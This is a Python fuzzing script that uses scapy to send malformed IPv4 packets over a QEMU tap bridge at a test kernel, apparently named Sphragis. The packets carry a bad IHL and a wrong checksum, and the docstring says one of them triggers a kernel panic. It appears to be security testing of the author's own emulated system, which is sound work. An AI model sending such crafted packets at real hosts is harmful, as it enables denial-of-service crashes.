#!/usr/bin/env python3
"""
fuzz_ip.py — ATTACK-NET-004, 005, 008

Requires QEMU tap bridge. Requires root.

ATTACK-004: IHL=4 (16 bytes, shorter than minimum).
ATTACK-005: IHL=15 (60 bytes) with total_len=20 → slice panic → kernel crash.
ATTACK-008: Valid-looking packet with deliberately wrong checksum.
"""

import sys
import struct

try:
    from scapy.all import Ether, IP, TCP, sendp, conf, raw
except ImportError:
    print("scapy required", file=sys.stderr)
    sys.exit(1)


IFACE = "tap0"
VICTIM_MAC = None  # discovered via ARP, or hard-code from QEMU MAC_ADDR config
VICTIM_IP = "10.0.2.15"
SRC_MAC = "02:aa:bb:cc:dd:01"
SRC_IP = "10.0.2.1"


def ether(dst_mac):
    return Ether(dst=dst_mac, src=SRC_MAC, type=0x0800)


def hand_ip_header(ihl, total_len, src, dst, proto=6):
    # Build a raw 20-byte header and set IHL to a chosen value.
    ver_ihl = (4 << 4) | (ihl & 0x0F)
    return struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, 0, total_len, 1, 0x4000,
        64, proto, 0,
        bytes(map(int, src.split("."))),
        bytes(map(int, dst.split("."))),
    )


def attack_004_ihl_too_small(dst_mac):
    hdr = hand_ip_header(ihl=4, total_len=20, src=SRC_IP, dst=VICTIM_IP)  # 16 bytes claimed
    # pad to 20 to satisfy Ethernet min
    pkt = ether(dst_mac).build() + hdr + b"\x00" * 26
    sendp(pkt, iface=IFACE, verbose=False)
    print("[ATTACK-NET-004] SENT IHL=4 packet")


def attack_005_ihl_greater_than_total_len(dst_mac):
    # IHL=15 (60 bytes) but total_len=20 → Sphragis slices data[60..20] → panic.
    hdr = hand_ip_header(ihl=15, total_len=20, src=SRC_IP, dst=VICTIM_IP)
    pkt = ether(dst_mac).build() + hdr + b"\x00" * 60
    sendp(pkt, iface=IFACE, verbose=False)
    print("[ATTACK-NET-005] SENT IHL=15/total_len=20 — expect kernel panic")


def attack_008_wrong_checksum(dst_mac):
    # Valid-looking TCP SYN but with a broken IP header checksum.
    ip = IP(src=SRC_IP, dst=VICTIM_IP) / TCP(sport=12345, dport=2222, flags="S")
    ip[IP].chksum = 0xDEAD
    pkt = ether(dst_mac) / raw(ip)
    sendp(pkt, iface=IFACE, verbose=False)
    print("[ATTACK-NET-008] SENT IP with wrong checksum — Sphragis should drop, likely accepts")


if __name__ == "__main__":
    conf.verb = 0
    dst = VICTIM_MAC or "52:54:00:12:34:56"  # QEMU default MAC
    attack_004_ihl_too_small(dst)
    attack_005_ihl_greater_than_total_len(dst)
    attack_008_wrong_checksum(dst)
